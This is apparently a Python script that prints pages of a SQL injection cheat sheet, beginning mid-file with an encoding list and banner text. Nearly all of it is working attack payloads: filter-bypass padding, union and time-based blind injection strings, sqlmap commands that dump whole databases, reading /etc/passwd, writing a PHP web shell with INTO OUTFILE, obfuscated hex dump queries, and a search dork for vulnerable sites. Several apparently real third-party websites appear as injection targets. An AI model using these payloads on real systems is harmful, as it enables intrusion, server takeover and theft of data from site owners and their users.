ascii,ujis,ucs2,tis620,swe7,sjis,macroman,macce,latin7,latin5,latin2,koi8u,koi8r,keybcs2,hp8,geostd8,gbk,gb2132,armscii8,ascii,cp1250,big5,cp1251,cp1256,cp1257,cp850,cp852,cp866,cp932,dec8,euckr,latin1,utf8


======================================================================================================
## The connection was reset##
======================================================================================================


?id=2-

?id=2-.1

?id=2-.1union select

--------------------------------------------------------------------------------------------
- Fatal Error Occurred
--------------------------------------------------------------------------------------------
NULL,NULL 
--------------------------------------------------------------------------------------------
Enumeration In SQL
--------------------------------------------------------------------------------------------
google : inurl:php?id= site:your site
----------------------------------------
Invalid Request!!!!
"""







clear()
print(bravo)
input("[Pres Enter]")



charle="""
 --------------------------------------------------------------------------------------------
 Forbidden On Union & Select # buffer over flow # union and select blocked
 --------------------------------------------------------------------------------------------
%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0a
--------------------------------------------------------------------------------------------
%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a
--------------------------------------------------------------------------------------------
union23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaselect
--------------------------------------------------------------------------------------------
union%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0aselect

cat=.4 union select version(),2 -- -&cacat=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

"""

clear()
print(charle)
input("[Pres Enter]")





delta="""
 Not Found Error Bypassing becouse hex encryptions #use this way when you use encryptions or pattrens like dot or $
--------------------------------------------------------------------------------------------
group_concat(tAblE_name)   from information_Schema.tables Where+table_ScHEmA=schEMA()-- -
--------------------------------------------------------------------------------------------
https://pastebin.com/raw/gp1Brynr
--------------------------------------------------------------------------------------------
.=252E
--------------------------------------------------------------------------------------------
space%20
--------------------------------------------------------------------------------------------
"    %22
#    %23
%    %25
&    %26
'    %27
(    %28
)    %29
*    %2A
+    %2B
,    %2C
.    %2E
/    %2F
0    %30
=    %3D
"""

clear()
print(delta)
input("[Pres Enter]")



india="""
Contradictory errors
--------------------------------------------------------------------------------------------
cat=7' is null
--------------------------------------------------------------------------------------------
select column1,column2 from table where condition=value order by column1 desc|asc limit 0,1  
--------------------------------------------------------------------------------------------
cat=43&id=230
------------------------------------
cat=43' order by 3 asc -- -&id=230
------------------------------------
cat=43' union a-- -&id=230
------------------------------------
cat=43' is null union a-- -&id=230
------------------------------------
cat=43' and 0 union a-- -&id=230
------------------------------------
cat=43' and 0 union/**/distinctrow select-- -&id=230
------------------------------------
cat=43' and 0 union/**/distinctrow select 1,2-- -&id=230
------------------------------------
cat=43' and 0 union/**/distinctrow select 1,version()-- -&id=230
------------------------------------
cat=43' and 0 union/**/distinctrow select 1,version()-- -&id=230
------------------------------------
cat=43' and 0 union/**/distinctrow Select 1,version()-- -&id=230


.4/*!32302union*/ /**/select/**/version(),2 -- -
.4/*!32302union*/distinctrow /**/select/**/version(),2 -- -
"""




clear()
print(india)
input("[Pres Enter]")






Nulling=""" 
Blind TIME BASED 
And (sleep(0))
And (sleep(25))
And SLEEP(25)=1
And SLEEP(25)=1 LIMIT 1
And BENCHMARK(200000,id)
%26%26 BENCHMARK(200000,id)
And BENCHMARK(200000,md5(id))
%26%26 BENCHMARK(200000,md5(id))
And BENCHMARK(1000000,MD5('A'))
And BENCHMARK(200000,md5(NOW())
--------------------------------------------------------------------------------------------------------------------------
Nulling The Column 
--------------------------------------------------------------------------------------------------------------------------
GHI&ID=10 union select 0x322d2d202d,2,3,4,5,6,7-- -
GHI&ID=10 union select 1,IFNULL(0x3023,0),3,4,5,6,7-- -
GHI&ID=10 union select 1,2,NULLIF(0x3023,1),4,5,6,7-- -
GHI&ID=10 union select 1,2,3,IFNULL(NULL,10),5,6,7-- -
GHI&ID=10 union select 1,2,3,4,IFNULL(1/0,'No'),6,7-- -
GHI&ID=10 union select 1,2,3,4,5,IF(0.1<>0,1,0),7-- -
HI&ID=10 union select 1,1,1,1,1,1,1-- -

--------------------------------------------------------------------------------------------------------------------------
# Other knowledge not to us #
--------------------------------------------------------------------------------------------------------------------------
id=.58'limit 1,1 union select Null,2,3-- -
id=.58'limit 1,1 union select 1,Null,3-- -
id=.58'limit 1,1 union select 1,2,Null-- -
id=.58'limit 1,1 union select true,2,3-- -
id=.58'limit 1,1 union select 1,true,3-- -
id=.58'limit 1,1 union select 1,2,true-- -
 --------------------------------------------------------------------------------------------------------------------------
# Brute Forcing Columns #
 --------------------------------------------------------------------------------------------------------------------------
news.php?id=.58'and 0 union select 1111 -- -
news.php?id=.58'and 0 union select 11111,2222-- -
news.php?id=.58'and 0 union select 11111,2222,3333-- -
news.php?id=.58'and 0 union select 11111,2222,3333,4444-- -
"""









clear()
print(Nulling)
input("[Pres Enter]")








#example="www.asfaa.org/members.php?id=1"

sqlmap="""
sqlmap -u websiteexample --level 4 --risk 3 --dbms=mysql -p id --batch --dbs
sqlmap -u websiteexample --level 4 --risk 3 dbms=mysql -p your_id --batch --dump-all
sqlmap -u websiteexample --level 4 --risk 3 dbms=mysql -p your_id --batch -D secret --table
sqlmap -u websiteexample --level 4 --risk 3 dbms=mysql -p your_id --batch -D secret -T users --column
sqlmap -u websiteexample --level 4 --risk 3 dbms=mysql -p your_id -D secret -T users --dump

--------------------------------------------------------------------------------------------------------------------------
"""








extra='''

"inurl:."/index.php?cat=7"/"com"/"de" "

--------------------------------------------------------------------------------------------------------------------------

select version() ;
select user() ;
select load_file('/etc/passwd') ;
select load_file('/etc/apache2/sites-enabled/000-default.conf') ;
/opt/lampp/htdocs
<?php system($_REQUEST["cmd"])?>
select 1 ,'<?php system($_REQUEST["cmd"])?>' into outfile '/home/cetrix/Desktop/2.php';
select 1,concat(version (),"a");
column_name from information_schema.columns where table.schema="stars"
 ?id=1' order by 1,2--+
 ?id=1' union select 1,2--+
 ?id=1' union select database(),version()--+
 ?id=1' union select table_name from information_schema.tables--+
 ?id=1' union select 1,column_name from information_schema.columns where table_name=char(117,115,101,114,115)--+
 ?id=1' union select user,password from users--
 

 select user() ;

 select 1 ,'<?php system($_REQUEST["cmd"])?>' into outfile '/tmp/2.php';
 select 1 ,'<?php system(["pwd"])?>' into outfile '/tmp/2.php';

 select auto_increment from information_Schema.tables ;

SELECT concat(Auto_Increment,'<br>',group_concat(table_name,'<br>' Separator 0x20)) from information_Schema.tables where auto_increment=1;

SELECT auto_increment,table_name from information_Schema.tables;






-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
' OR '1'='1' –
' OR '1'='1' /*
-- MySQL
' OR '1'='1' #
-- Access (using null characters)
' OR '1'='1' %00
' OR '1'='1' %16





sqlmap -u www.balabas.com.ua/buy.php?cat=1 --level 4 --risk 3 dbms=mysql -p cat --batch --dump-all





https://github.com/certix7/sqllite/blob/main/databases_FingerPrint


-----------------------------------------------------------------
‫‪SQL‬‬ ‫‪Injection‬‬ ‫‪Closures‬‬ ‫‪Technic‬‬ ‫‪
=================================================

‫http://www.InjectorBoy.GHT?id=1‬‬) ‫‪order‬‬ ‫‪by‬‬ ‫‪100--‬‬ ‫‪-‬‬


‫•‬ ‫‪D.I.V‬‬ ‫‪Injection‬‬ 

‫‪http://www.InjectorBoy.GHT?id=1,1‬‬


‫http://www.InjectorBoy.GHT?id=1,version‬‬()


‫•‬ ‫‪Hidden‬‬ ‫‪Vlun‬‬ ‫‪

Well let's make a mess
• my.ukrtelecom.ua/files/download@/6'.pdf
• my.ukrtelecom.ua/files/FuckYou/6'.pdf
• my.ukrtelecom.ua/files/1983/6'.pdf
• my.ukrtelecom.ua/files/sqli/6'.pdf
‫

‫‪Update‬‬ ‫‪Statement‬‬ ‫‪Code‬‬
‫'*)‪'*updatexml(1,concat(0x1,version()),1‬‬
‫
‫‪www.Ahmed-El-Melegy.be/files/download@/6'*updatexml(1,concat(0x1,version()),1)*'.pdf‬‬


my.ukrtelecom.ua/files/download@/6'*updatexml(1,concat(0x1,version()),1)*'.pdf


----------------------
7
-------------------
http://www.igoergo.com/_site/products.php?cat=.4 group by 1,2 -- -



 select *  from sites PROCEDURE ANALYSE() ;



 ‫‪--‬‬ ‫‪-‬‬
‫‪SQL‬‬ ‫‪comment‬‬
‫‪--+‬‬
‫‪--+-‬‬
‫‪+--+‬‬
‫*‪/‬‬
‫‪C-style‬‬ ‫‪comment‬‬
‫‪,'a'--‬‬ ‫‪-‬‬
‫‪NUL‬‬ ‫‪Nullbyte‬‬ ‫‪(MySQL‬‬ ‫<‬ ‫)‪5.1‬‬
‫>>>‬ ‫‪Note:‬‬ ‫‪The‬‬ ‫‪backtick‬‬ ‫‪can‬‬ ‫‪only‬‬ ‫‪be‬‬ ‫‪used‬‬ ‫‪to‬‬ ‫‪end‬‬ ‫‪a‬‬ ‫‪query‬‬ ‫‪when‬‬ ‫‪used‬‬ ‫‪as‬‬ ‫‪an‬‬ ‫‪alias‬‬
‫‪;%00‬‬
‫!‪;%00‬‬
‫‪%60‬‬ ‫`‬ ‫‪Backtick‬‬
‫‪`alias‬‬ ‫‪starts‬‬
‫‪Hash‬‬ ‫‪comment,‬‬ ‫‪line‬‬ ‫‪comment,‬‬ ‫‪continue‬‬ ‫‪on‬‬ ‫‪newline‬‬
‫‪SYN‬‬
‫‪LF‬‬
‫‪CR‬‬
‫‪VT‬‬
‫‪FF‬‬
‫‪%23‬‬ ‫‪#‬‬
‫‪%16‬‬
‫‪%0A‬‬
‫‪%0D‬‬
‫‪%0B‬‬
‫‪%0C‬‬
‫;'`‬
‫;''‬
‫‪--%a0‬‬


-------------------------------------------------------------------------
found admin page
----------------------------


https://www.adminbooster.com/tool/site_review


@@port:Check Ports
@@version_compile_os:Check which Operationg system is running
@@CHARACTER_SET_FILESYSTEM: tell File system:
@@version_compile_machine:Check 32 bit/64 bit
@@hostname:Current Hostname
@@tmpdir:Tept Directory
@@datadir:Data Directory
@@version:Version of DB
@@basedir:Base Directory
user():Current User
database():Current Database
version():Version
schema():current Database
UUID():System UUID key
current_user():Current User
current_user:Current User
system_user():Current Sustem user
session_user():Session user
@@GLOBAL.have_symlink:Check if Symlink Enabled or Disabled
@@GLOBAL.have_ssl:Check if it have ssl or not
-------------------------------





cf7-database




'''



clear()
print(extra)
input("[Pres Enter]")

clear()


einfo="""
-------------------------------------------------------------------------



export_set(5,@:=0,(select count(*)/*!50000from*/ /*!50000information_schema*/.columns where table_schema=database() and @:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)


export_set(5,@:=0,(select count(*)/*!50000from*/ /*!50000information_schema*/.columns where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)


make_set(6,@:=0x0a,(/*!50000select*/(1) from (/*!50000information_schema.columns*/)where@:=make_set(511,@,0x3c6c693e,/*!50000table_name*/,/*!50000column_name*/)),@)


replace(replace(replace(0x232425,0x23,@:=replace(replace(0x243a3a25,0x24,@@version),0x25 ,version())),0x24,(select count(*)from /*!50000information_schema*/.columns where table_schema=database() and@:=replace(replace(replace(0x03c62723e2a3a3a2d,0x00,@),0x2a,table_name),0x2d,Column_name))),0x25,@)


reverse(insert(0x1,1,0,reverse(unhex(hex(table_name))))) FROM information_schema 0.e.tables limit 1,1

reverse(insert(0x1,1,0,reverse(concat (unhex(hex(table_name)),0x203a20,unhex(hex(column_name)),0x3c62723e)))) from information_schema 0.e.columns limit 1,1

-------------------------------------------------------------------------

"COALESCE" Function
-------------------------------------------------------------------------


concat(0x3c666f6e7420636f6c6f723d707572706c653e3c623e3c693e436865657461682048657265203a3a20,@@version,0x3c62723e,0x3c62723e,(SELECT GROUP_CONCAT(table_name,0x203a3a20,COALESCE(table_rows,0) order by COALESCE(table_rows,0) ASC SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()))

-------------------------------------------------------------------------
 "IFNULL" function
-------------------------------------------------------------------------

concat(0x3c666f6e7420636f6c6f723d707572706c653e3c623e3c693e436865657461682048657265203a3a20,@@version,0x3c62723e,0x3c62723e,(SELECT GROUP_CONCAT(table_name,0x203a3a20,ifnull(table_rows,0) order by ifnull(table_rows,0) ASC SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()))

-------------------------------------------------------------------------



(replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x753c62723e763c62723e773c62723e78,0x75,0x3c666f6e7420636f6c6f723d7265642073697a653d3530303e494e4a4543544f523c2f666f6e743e3c62723e),0x76,version()),0x77,user()),0x78,database())),0x24,(select count(*)from(information_schema.columns)where table_schema=database() and@:=replace(replace(replace(0x03c62723e2a3a3a2d,0x00,@),0x2a,table_name),0x2d,column_name))),0x25,@))
-------------------------------------------------------------------------


-------------------------------------------------------------------------
MID_SEPARATOR
-------------------------------------------------------------------------

(select MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns)

-------------------------------------------------------------------------

DUMP Column |repeted
-------------------------------------------------------------------------

concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e
3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c65
3d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6
a656374656420627920426c61436b20526f7365205b4748545d3a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f
6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d6
77265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a
3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c
666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e
203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e7
33c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,(Select count(*)from(information_Schema.columns)where(table_schema=database())and@:=concat/**/(@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e2
03a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name
,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c627
23e3c62723e3c62723e)
